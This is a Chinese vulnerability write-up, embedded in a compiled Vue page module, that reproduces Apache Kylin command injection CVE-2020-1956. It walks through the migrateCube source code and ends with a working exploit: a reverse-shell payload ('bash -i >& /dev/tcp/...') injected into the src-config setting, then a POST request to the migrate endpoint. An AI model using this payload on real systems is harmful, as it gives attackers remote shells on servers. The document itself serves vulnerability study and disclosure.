import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>2020年5月22日，CNVD通报了 Apache Kylin存在命令注入漏洞 CVE-2020-1956</p><p>Apache Kylin 是美国 Apache软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 Hadoop/Spark之上的 SQL查询接口及多维分析（OLAP）等功能。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Kylin 2.3.0 ~ 2.3.2
Apache Kylin 2.4.0 ~ 2.4.1
Apache Kylin 2.5.0 ~ 2.5.2
Apache Kylin 2.6.0 ~ 2.6.5
Apache Kylin 3.0.0-alpha
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker pull apachekylin/apache-kylin-standalone:3.0.1

docker run -d \\
-m 8G \\
-p 7070:7070 \\
-p 8088:8088 \\
-p 50070:50070 \\
-p 8032:8032 \\
-p 8042:8042 \\
-p 16010:16010 \\
apachekylin/apache-kylin-standalone:3.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251557885.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>查看这个漏洞修复的补丁</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558943.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里可以看到此漏洞有关的参数有三个，分别是 <code>srcCfgUri</code>、<code>dstCfgUri</code>、<code>projectName</code>, 相关的函数为 <code>migrateCube</code></p><p>官方文档中对 <code>migrateCube</code> 的描述</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558190.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /kylin/api/cubes/{cube}/{project}/migrate
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>下载 Apache Kylin 3.0.1 的源代码进行代码审计,出现漏洞函数的文件为以下路径</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>找到<code>migrateCube</code>函数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558268.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN
            + &quot; or hasPermission(#cube, &#39;ADMINISTRATION&#39;) or hasPermission(#cube, &#39;MANAGEMENT&#39;)&quot;)
    public void migrateCube(CubeInstance cube, String projectName) {
        KylinConfig config = cube.getConfig();
        if (!config.isAllowAutoMigrateCube()) {
            throw new InternalErrorException(&quot;One click migration is disabled, please contact your ADMIN&quot;);
        }

        for (CubeSegment segment : cube.getSegments()) {
            if (segment.getStatus() != SegmentStatusEnum.READY) {
                throw new InternalErrorException(
                        &quot;At least one segment is not in READY state. Please check whether there are Running or Error jobs.&quot;);
            }
        }

        String srcCfgUri = config.getAutoMigrateCubeSrcConfig();
        String dstCfgUri = config.getAutoMigrateCubeDestConfig();

        Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), &quot;Source configuration should not be empty.&quot;);
        Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), &quot;Destination configuration should not be empty.&quot;);

        String stringBuilderstringBuilder = (&quot;%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true&quot;);
        String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri,
                cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge());

        logger.info(&quot;One click migration cmd: &quot; + cmd);

        CliCommandExecutor exec = new CliCommandExecutor();
        PatternedLogger patternedLogger = new PatternedLogger(logger);

        try {
            exec.execute(cmd, patternedLogger);
        } catch (IOException e) {
            throw new InternalErrorException(&quot;Failed to perform one-click migrating&quot;, e);
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>PreAuthorize</code>里面定义了路由权限，<code>ADMIN</code>权限、<code>ADMINISTRATION</code>权限和<code>MANAGEMENT</code>权限可以访问该<code>service</code>。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN
            + &quot; or hasPermission(#cube, &#39;ADMINISTRATION&#39;) or hasPermission(#cube, &#39;MANAGEMENT&#39;)&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>在1087行判断是否开启了<code>MigrateCube</code>设置，如果没有开启则会报错</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558550.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>跟进 <code>isAllowAutoMigrateCube()</code> 这个函数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558677.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到这里默认的配置<code>kylin.tool.auto-migrate-cube.enabled</code>就是<code>Flase</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public boolean isAllowAutoMigrateCube() {
        return Boolean.parseBoolean(getOptional(&quot;kylin.tool.auto-migrate-cube.enabled&quot;, FALSE));
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在没有开启配置<code>kylin.tool.auto-migrate-cube.enabled</code>为<code>true</code>的情况下，调用<code>MigrateCube</code>则会出现报错</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558637.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过<code>Apache Kylin</code>的<code>SYSTEM模块</code>开启<code>kylin.tool.auto-migrate-cube.enabled</code>为<code>True</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558498.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251558818.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>设置后再去请求则不会出现刚刚的报错，而是出现<code>Source configuration should not be empty</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251559422.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>跟进出现报错的代码块</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>String srcCfgUri = config.getAutoMigrateCubeSrcConfig();
        String dstCfgUri = config.getAutoMigrateCubeDestConfig();

        Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), &quot;Source configuration should not be empty.&quot;);
        Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri),
                &quot;Destination configuration should not be empty.&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里进行了对<code>kylin.tool.auto-migrate-cube.src-config</code>和<code>kylin.tool.auto-migrate-cube.dest-config</code>的配置进行了检测,如果为空则会出现刚刚的报错</p><p>跟进 <code>getAutoMigrateCubeSrcConfig()</code>和<code>getAutoMigrateCubeDestConfig()</code>函数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251559379.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public String getAutoMigrateCubeSrcConfig() {
        return getOptional(&quot;kylin.tool.auto-migrate-cube.src-config&quot;, &quot;&quot;);
    }

    public String getAutoMigrateCubeDestConfig() {

        return getOptional(&quot;kylin.tool.auto-migrate-cube.dest-config&quot;, &quot;&quot;);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现这两个配置默认为空，因为配置允许自定义，所以<code>srcCfgUri</code>和<code>dstCfgUri</code>两个变量均是可控的, 继续向下走，发现一处<code>命令拼接</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251559785.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>String stringBuilder = (&quot;%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true&quot;);
        String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri,
                cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge());

        logger.info(&quot;One click migration cmd: &quot; + cmd);

        CliCommandExecutor exec = new CliCommandExecutor();
        PatternedLogger patternedLogger = new PatternedLogger(logger);

        try {
            exec.execute(cmd, patternedLogger);
        } catch (IOException e) {
            throw new InternalErrorException(&quot;Failed to perform one-click migrating&quot;, e);
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>进入到<code>execute</code>函数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private Pair&lt;Integer, String&gt; runRemoteCommand(String command, Logger logAppender) throws IOException {
        SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd);

        SSHClientOutput sshOutput;
        try {
            sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender);
            int exitCode = sshOutput.getExitCode();
            String output = sshOutput.getText();
            return Pair.newPair(exitCode, output);
        } catch (IOException e) {
            throw e;
        } catch (Exception e) {
            throw new IOException(e.getMessage(), e);
        }
    }

    private Pair&lt;Integer, String&gt; runNativeCommand(String command, Logger logAppender) throws IOException {
        String[] cmd = new String[3];
        String osName = System.getProperty(&quot;os.name&quot;);
        if (osName.startsWith(&quot;Windows&quot;)) {
            cmd[0] = &quot;cmd.exe&quot;;
            cmd[1] = &quot;/C&quot;;
        } else {
            cmd[0] = &quot;/bin/bash&quot;;
            cmd[1] = &quot;-c&quot;;
        }
        cmd[2] = command;

        ProcessBuilder builder = new ProcessBuilder(cmd);
        builder.redirectErrorStream(true);
        Process proc = builder.start();

        BufferedReader reader = new BufferedReader(
                new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8));
        String line;
        StringBuilder result = new StringBuilder();
        while ((line = reader.readLine()) != null &amp;&amp; !Thread.currentThread().isInterrupted()) {
            result.append(line).append(&#39;\\n&#39;);
            if (logAppender != null) {
                logAppender.log(line);
            }
        }

        if (Thread.interrupted()) {
            logger.info(&quot;CliCommandExecutor is interruppted by other, kill the sub process: &quot; + command);
            proc.destroy();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // do nothing
            }
            return Pair.newPair(1, &quot;Killed&quot;);
        }

        try {
            int exitCode = proc.waitFor();
            return Pair.newPair(exitCode, result.toString());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException(e);
        }
    }

}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由此可以得出我们可以通过这两个可控的参数，执行任意我们需要的命令，例如反弹一个shell，设置的配置为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kylin.tool.auto-migrate-cube.enabled=true
kylin.tool.auto-migrate-cube.src-config=echo;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/9999 0&gt;&amp;1
kylin.tool.auto-migrate-cube.dest-config=shell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251559000.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再去发送<code>POST</code>请求 <code>/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251559859.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功反弹一个shell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251559067.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,54),r=[d];function l(s,c){return i(),n("div",null,r)}const v=e(t,[["render",l],["__file","Apache Kylin CubeService.java 命令注入漏洞 CVE-2020-1956.html.vue"]]);export{v as default};
